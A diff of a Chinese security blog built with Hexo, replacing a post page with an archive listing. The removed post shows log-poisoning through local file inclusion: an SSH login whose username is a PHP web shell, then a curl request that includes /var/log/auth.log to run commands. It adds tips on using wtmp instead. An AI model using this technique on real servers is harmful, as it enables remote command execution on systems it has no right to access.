@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          LFI SSH日志 - Rootclay
+          Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/03/23/lfi_ssh/">
+    <link rel="canonical" href="http://rootclay.github.io/archives/3/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -69,8 +69,8 @@
 <style type="text/css">
     header.intro-header{
         
-            background-image: url('header.png')
-            /*post*/
+            background-image: url('/img/header_img/home-bg-2-dark.png') 
+            /*config*/
         
     }
     
@@ -83,22 +83,10 @@
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 
-                    <div class="post-heading">
-                        <div class="tags">
-                            
-                              <a class="tag" href="/tags/#Web" title="Web">Web</a>
-                            
-                              <a class="tag" href="/tags/#LFI" title="LFI">LFI</a>
-                            
-                              <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
-                            
-                        </div>
-                        <h1>LFI SSH日志</h1>
-                        <h2 class="subheading">通过LFI包含到SSH日志来获取SHELL.</h2>
-                        <span class="meta">
-                            Posted by Rootclay on
-                            2017-03-23
-                        </span>
+                    <div class="site-heading">
+                        <h1>ROOTCLAY</h1>
+                        <!--<hr class="small">-->
+                        <span class="subheading">Only when you plant the flowers can you really smell their fragrance.</span>
                     </div>
                 
 
@@ -201,185 +189,212 @@
 
 
     <!-- Main Content -->
-    <!-- Modify by Yu-Hsuan Yen -->
+    <!-- Main Content -->
+<div class="container">
+    <div class="row">
+        
 
-<!-- Post Content -->
-<article>
-    <div class="container">
-        <div class="row">
-
-            <!-- Post Container -->
+<!-- USE SIDEBAR -->
+    <!-- Post Container -->
             <div class="
-                col-lg-8 col-lg-offset-2
-                col-md-10 col-md-offset-1
-                post-container">
-
-                <h1 id="lfi-ssh日志">LFI SSH日志</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh <span class="string">'&lt;?php system($_GET[‘c’]); ?&gt;'</span>@192.168.32.137</div></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://192.168.32.137/lfi.php?file=/var/<span class="built_in">log</span>/auth.log&amp;c=ls</div></pre></td></tr></table></figure>
-<p>Tips:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/var/<span class="built_in">log</span>/auth.log只有ubuntu系有。</div><div class="line">其实对linux，可以包含/var/<span class="built_in">log</span>/wtmp。一样的效果。有16字符可控，足够了。</div><div class="line">只可以没有x权限。</div></pre></td></tr></table></figure>
-                
-
-                <hr>
-                <!-- Pager -->
-                <ul class="pager">
-                    
-                        <li class="previous">
-                            <a href="/2017/03/23/mysql日志包含拿shell/" data-toggle="tooltip" data-placement="top" title="SQL语句利用日志写shell">&larr; Previous Post</a>
-                        </li>
-                    
-                    
-                        <li class="next">
-                            <a href="/2017/03/20/docker三剑客/" data-toggle="tooltip" data-placement="top" title="Docker 三侠客">Next Post &rarr;</a>
-                        </li>
-                    
-                </ul>
-
-                <!-- duoshuo Share start -->
-                
-                <!-- 多说 Share end-->
-
-                <!-- 多说评论框 start -->
-                
-                <!-- 多说评论框 end -->
-
-                <!-- disqus comment start -->
-                
-                    <div class="comment">
-                        <div id="disqus_thread" class="disqus-thread"></div>
-                    </div>
-                
-                <!-- disqus comment end -->
-            </div>
+                col-lg-8 col-lg-offset-1
+                col-md-8 col-md-offset-1
+                col-sm-12
+                col-xs-12
+                post-container
+            ">
             
-            <!-- Tabe of Content -->
-            <!-- Table of Contents -->
+                <!-- Main Content -->
 
-    
-      <aside id="sidebar">
-        <div id="toc" class="toc-article">
-        <strong class="toc-title">Contents</strong>
-        
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#lfi-ssh日志"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LFI SSH日志</span></a></li></ol>
-        
+
+<div class="post-preview">
+
+    <a href="/2017/01/24/js_hosting/">
+        <h2 class="post-title">
+            JavaScript中变量提升
+        </h2>
+        <h3 class="post-subtitle">
+            JavaScript中变量提升------Hoisting.
+        </h3>
+        <div class="post-content-preview">
+            案发现场
+我们先看一段很简单的代码：
+12var v='Hello World';alert(v);
+这个没有疑问吧，弹出“Hello World”。OK，我们继续。
+我们在看一段Code：
+1234var v='Hello World';(function()&#123;    alert(v);&#125;)()
+经过运行之后，我们发现，还是和我们预期的一样，弹出了“Hello Worl......
         </div>
-      </aside>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-01-24
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+              <a href="/tags/#JavaScript" title="JavaScript">JavaScript</a>
+            
+        </div>
     
 
-                
-            <!-- Sidebar Container -->
-            <div class="
-                col-lg-8 col-lg-offset-2
-                col-md-10 col-md-offset-1
-                sidebar-container">
+</div>
+<hr>
 
-                <!-- Featured Tags -->
-                
-                <section>
-                    <!-- no hr -->
-                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
-                    <div class="tags">
-                       
-                          <a class="tag" href="/tags/#Web" title="Web">Web</a>
-                        
-                          <a class="tag" href="/tags/#LFI" title="LFI">LFI</a>
-                        
-                          <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
-                        
-                    </div>
-                </section>
-                
 
-                <!-- Friends Blog -->
-                
-                <hr>
-                <h5>FRIENDS</h5>
-                <ul class="list-inline">
 
-                    
-                        <li><a href="http://syclover.sinaapp.com/" target="_blank">Syclover Team</a></li>
-                    
-                        <li><a href="http://www.cnblogs.com/iamstudy/" target="_blank">l3m0n</a></li>
-                    
-                        <li><a href="http://www.k1n9.me/" target="_blank">k1n9</a></li>
-                    
-                        <li><a href="http://v1ct0r.com/" target="_blank">v1ct0r</a></li>
-                    
-                        <li><a href="http://www.cnblogs.com/Ox9A82/" target="_blank">Ox9a82</a></li>
-                    
-                        <li><a href="http://xianyusec.com/" target="_blank">咸鱼</a></li>
-                    
-                        <li><a href="http://lightning-zgc.com/" target="_blank">lightning</a></li>
-                    
-                        <li><a href="http://o0xmuhe.me/" target="_blank">0xmuhe</a></li>
-                    
-                        <li><a href="http://godot.win/" target="_blank">godot</a></li>
-                    
-                        <li><a href="http://hebic.me/" target="_blank">Homaebic</a></li>
-                    
-                </ul>
+<!-- Pager -->
+
+<ul class="pager">
+    
+        <li class="previous">
+            <a href="/archives/2/">&larr; Newer Posts</a>
+        </li>
+    
+    
+</ul>
+
+
+
+                <!-- 如果开启评论功能 -->
                 
             </div>
-        </div>
+
+          <!-- Sidebar Container -->
+<div class="
+    col-lg-3 col-lg-offset-0
+    col-md-3 col-md-offset-0
+    col-sm-12
+    col-xs-12
+    sidebar-container
+">
+    
+        <!-- Short About -->
+<section class="visible-md visible-lg">
+    <h5><a href="/about/">ABOUT ME</a></h5>
+    <div class="short-about">
+
+        
+            <img id = "avatar_pic" src="/img/wechat.png" />
+        
+
+        
+            <p>Let&#39;s Wechat! Mail:whoisclay#outlook.com</p>
+        
+
+        <!-- SNS Link -->
+        <ul class="list-inline">
+            
+            
+            
+                <li>
+                    <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
+                        <span class="fa-stack fa-lg">
+                            <i class="fa fa-circle fa-stack-2x"></i>
+                            <i class="fa  fa-stack-1x fa-inverse">知</i>
+                        </span>
+                    </a>
+                </li>
+            
+
+            
+                <li>
+                    <a target="_blank" href="http://weibo.com/u/5715481982">
+                        <span class="fa-stack fa-lg">
+                            <i class="fa fa-circle fa-stack-2x"></i>
+                            <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                        </span>
+                    </a>
+                </li>
+            
+
+            
+
+            
+                <li>
+                    <a target="_blank"  href="https://github.com/rootclay">
+                        <span class="fa-stack fa-lg">
+                            <i class="fa fa-circle fa-stack-2x"></i>
+                            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                        </span>
+                    </a>
+                </li>
+            
+            
+            
+            
+        </ul>
     </div>
-</article>
+</section>
+        <hr>
+    
+        
+  <h5>RECENT POSTS</h3>
+  <div class="widget">
+    <ul>
+      
+        <li>
+          <a href="/2017/08/02/日志清理/">日志清理</a>
+        </li>
+      
+        <li>
+          <a href="/2017/08/01/SSH如何稳定方向代理/">SSH如何反向代理稳定穿透内网</a>
+        </li>
+      
+        <li>
+          <a href="/2017/07/25/内网代理/">内网代理</a>
+        </li>
+      
+        <li>
+          <a href="/2017/06/01/Esrc议题/">ESRC成都站议题分享</a>
+        </li>
+      
+        <li>
+          <a href="/2017/05/29/xxe/">XXE</a>
+        </li>
+      
+    </ul>
+  </div>
 
+        <hr>
+    
+        <!-- Friends Blog -->
 
+<h5>FRIENDS</h5>
+<ul class="list-inline">
 
+    
+        <li><a href="http://syclover.sinaapp.com/" target="_blank">Syclover Team</a></li>
+    
+        <li><a href="http://www.cnblogs.com/iamstudy/" target="_blank">l3m0n</a></li>
+    
+        <li><a href="http://www.k1n9.me/" target="_blank">k1n9</a></li>
+    
+        <li><a href="http://v1ct0r.com/" target="_blank">v1ct0r</a></li>
+    
+        <li><a href="http://www.cnblogs.com/Ox9A82/" target="_blank">Ox9a82</a></li>
+    
+        <li><a href="http://xianyusec.com/" target="_blank">咸鱼</a></li>
+    
+        <li><a href="http://lightning-zgc.com/" target="_blank">lightning</a></li>
+    
+        <li><a href="http://o0xmuhe.me/" target="_blank">0xmuhe</a></li>
+    
+        <li><a href="http://godot.win/" target="_blank">godot</a></li>
+    
+        <li><a href="http://hebic.me/" target="_blank">Homaebic</a></li>
+    
+</ul>
 
-<!-- disqus embedded js code start (one page only need to embed once) -->
-<script type="text/javascript">
-    /* * * CONFIGURATION VARIABLES * * */
-    var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/03/23/lfi_ssh/";
-    var disqus_url = "http://rootclay.github.io/2017/03/23/lfi_ssh/";
+        <hr>
+    
+</div>
 
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<!-- disqus embedded js code start end -->
-
-
-
-
-<!-- async load function -->
-<script>
-    function async(u, c) {
-      var d = document, t = 'script',
-          o = d.createElement(t),
-          s = d.getElementsByTagName(t)[0];
-      o.src = u;
-      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
-      s.parentNode.insertBefore(o, s);
-    }
-</script>
-<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
-<script>
-    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
-        anchors.options = {
-          visible: 'hover',
-          placement: 'left',
-          icon: 'ℬ'
-        };
-        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
-    })
-</script>
-<style>
-    /* place left on bigger screen */
-    @media all and (min-width: 800px) {
-        .anchorjs-link{
-            position: absolute;
-            left: -0.75em;
-            font-size: 1.1em;
-            margin-top : -0.1em;
-        }
-    }
-</style>
-
+        
+    </div>
+</div>
 
 
     <!-- Footer -->
